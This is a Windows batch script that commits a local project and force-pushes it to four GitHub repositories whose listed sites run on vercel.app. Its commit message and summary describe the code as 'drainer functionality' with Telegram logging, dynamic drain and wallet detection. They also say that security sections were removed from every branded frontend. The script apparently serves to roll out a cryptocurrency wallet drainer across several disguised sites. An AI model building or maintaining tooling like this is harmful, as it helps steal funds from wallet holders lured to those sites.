@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Pushing core functionality to all repositories...
echo.
echo Repositories to update:
echo - MISUSE (misuse.vercel.app)
echo - XENA (xena-brown.vercel.app)
echo - Mambo (mambo-azure.vercel.app)
echo - Uranus
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Committing latest changes...
git add .
git commit -m "UPDATE: Core drainer functionality - Telegram logging, dynamic drain, wallet detection"
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Core functionality pushed to all repositories.
echo.
echo Summary:
echo - All repositories updated with latest core functionality
echo - Individual brandings preserved (MISUSE, XENA, Mambo, Uranus)
echo - Telegram logging, dynamic drain, wallet detection added
echo - Security sections removed from all frontends
echo - Transaction cancellation logging added
echo.
echo Updated repositories:
echo - MISUSE: https://github.com/SacredPath/MISUSE.git
echo - XENA: https://github.com/SacredPath/XENA.git
echo - Mambo: https://github.com/SacredPath/Mambo.git
echo - Uranus: https://github.com/SacredPath/Uranus.git
pause
